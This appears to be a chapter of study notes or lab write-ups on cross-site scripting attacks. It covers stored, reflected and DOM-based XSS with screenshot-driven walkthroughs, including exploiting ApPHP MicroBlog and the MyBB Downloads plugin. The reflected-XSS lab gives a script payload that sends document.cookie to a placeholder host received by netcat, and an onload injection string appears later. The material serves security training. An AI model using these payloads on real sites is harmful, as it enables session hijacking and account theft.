# CHAPTER 4 - XSS Attacks

## Introduction to XSS Attacks

- Stored XSS attacks occur when the attacker injects malicious code into a web application's database or other storage mechanism, such as a comment section or user profile field. The malicious code is then served to all users who view the affected page, regardless of their session or browser.
- Reflected XSS attacks are carried out by injecting malicious code into a web application's input fields, such as search boxes, forms, or URLs. The input is then reflected back to the user in the form of an error message, search results, or a page redirect. When the victim clicks on the link or submits the form, the malicious code is executed in their browser.
- DOM-Based XSS attacks occur when the vulnerable code is present in the Document Object Model (DOM) of the web page. The attacker exploits a weakness in the web application's JavaScript code to modify the values of the script's variables and inject malicious code into the DOM. When the victim loads the web page, the malicious code is executed in their browser.

1. In a Cross-site scripting attack, malicious code is executed on the client.

2. Cross-site scripting is associated with the language **JavaScript**.

3. In an XSS attack, **Cookies** can be stolen.

4. JavaScript code is included in the HTML element \<script\>.

5. JavaScript can be used to interact with the DOM.

6. XSS can be exploited by tampering with parameters in a GET request.

### **LABORATORY 1**. XSS: Cross-Site Scripting Attacks

**Objective**: In this lab, you will get hands-on experience on how to identify and exploit an XSS vulnerability manually. The objective of this lab is to demonstrate the process of identifying XSS vulnerabilities in web applications, how to identify the type of XSS vulnerability (Stored, Reflected or DOM-XSS) and how to exploit the vulnerability manually.

We are haveing access to a login page, we can try to inject *JS* code and identify if is vulnerable to XSS. Before of that we will see how the data is sent.

![Alt text](ch4_page_images/image-19.png)

The data is beeing sent with GET method, maybe could be a *reflected XSS*.

![Alt text](ch4_page_images/image-20.png)

Trying the *JS* code. The response is a bit strange. Let's send it on Burp Suite and analyze the response.

![Alt text](ch4_page_images/image-21.png)

The output is part of the code.

![Alt text](ch4_page_images/image-23.png)

We are seeing part of the code, maybe we can try to close the value label doing *">* and commenting the rest of the code with *!<--*

![Alt text](ch4_page_images/image-24.png)

And here is the result.

![Alt text](ch4_page_images/image-25.png)

Now we can say this page is vulnerable to a *Reflected XSS*.

## Reflected XSS

1. Reflected XSS is considered **less damaging** than stored XSS.

2. XSS can be exploited by including Javascript code in a **POST request**.

### **LABORATORY 1**. Reflected XSS

**Objective**: Perform Reflected XSS attack on the application and retrieve the cookies.

We have access to a page, it can search users, and we see the input is beeing send via GET method.

![Alt text](ch4_page_images/image-26.png)

That make me think about to inject a *JS* code, searching for a *XSS injection*.

![Alt text](ch4_page_images/image-27.png)

Knowing that this field is vulnerable to XSS injection let's try to show the session cookie.

![Alt text](ch4_page_images/image-28.png)

The vulnerability is a **Reflected XSS** because the value is reflected back. We can identfy it seeing the source code or using Burp Suite.

![Alt text](ch4_page_images/image-29.png)

###  **LABORATORY 2**. Cookie Stealing Via Reflected XSS

**Objective**: Steal the session cookie using XSS.

We have to create a *JS* payload that send to us the session cookie.

Once we know that the fild is vulnerable to *XSS injection* just use that:

```bash
<script>new Image().src='http://ip:port/?v_cookie=' + encodeURI(document.cookie);</script>
```
![Alt text](ch4_page_images/image-30.png)

Before we send that, we have to use netcat to listen in the specifyed port.

![Alt text](ch4_page_images/image-31.png)

Now send the malicious code.

![Alt text](ch4_page_images/image-32.png)

And we recive the cookie.

![Alt text](ch4_page_images/image-33.png)

## Stored XSS

1. An attacker injects a malicious XSS payload in the comments section of a website, this code would typically run **on every browser that visits the page**.

### **LABORATORY 1**. ApPHP MicroBlog

When we open the lab we see that:

![Alt text](ch4_page_images/image-34.png)

If we search by the version of the CMS (ApPHP), we will notice that is vulnerable to XSS.

![Alt text](ch4_page_images/image-35.png)

Here explain how the vulnerability works.

![Alt text](ch4_page_images/image-36.png)

If we click in the comments, the url changes:

![Alt text](ch4_page_images/image-37.png)

Now we know the vulneable path, is time to search de vulnerable field. I will search it in the source code. And I see that is the **Name** field.

![Alt text](ch4_page_images/image-38.png)

Then try to insert the code there.

![Alt text](ch4_page_images/image-39.png)

If we publish it we see the alert. I changed the "mnec0" to a 7 and added the ";". Thats why we see a "7" instead of "mnec0".

![Alt text](ch4_page_images/image-40.png)

Now let's get the session cookie.

![Alt text](ch4_page_images/image-41.png)

Reciving the cookie.

![Alt text](ch4_page_images/image-42.png)

### **LABORATORY 2**. MyBB Downloads Plugin

**Objective**: Your task is to find and exploit this vulnerability.

We have the information that MyBB Downloads Plugin is vulnerable and also the user and password for simulate the cookie stealing.

![Alt text](ch4_page_images/image-43.png)

Let's see the page interface. We will login.

![Alt text](ch4_page_images/image-44.png)
![Alt text](ch4_page_images/image-45.png)

Now we are logged take a look to the vulnerability document.

![Alt text](ch4_page_images/image-46.png)

Let's follow the instructions.

![Alt text](ch4_page_images/image-47.png)

Create a *New Download*

![Alt text](ch4_page_images/image-48.png)

Add the following to the title \<BODY ONLOAD=alert('XSS')\>

![Alt text](ch4_page_images/image-49.png)

We did it!

![Alt text](ch4_page_images/image-50.png)

## DOM-Based XSS

1. The DOM can be used to modify data stored in the database of a web application.

2. `element.innerHTML` is a DOM property that can be used to change HTML elements.

### **LABORATORY 1**. Exploiting DOM-Based XSS Vulnerabilities

This is the page interface.

![Alt text](ch4_page_images/image-51.png)

We are seeing a **10+10** in the url and under *Mathemagic* we see a **20**, let's change the numbers or try to insert code.

![Alt text](ch4_page_images/image-52.png)

If we inspect the source code we can see it is using the eval() function.

![Alt text](ch4_page_images/image-53.png)

Searching information about this function I found that is dangerous in some cases.

![Alt text](ch4_page_images/image-54.png)

Let's try to inject malicious code.

![Alt text](ch4_page_images/image-55.png)

Showing the session cookie.

![Alt text](ch4_page_images/image-56.png)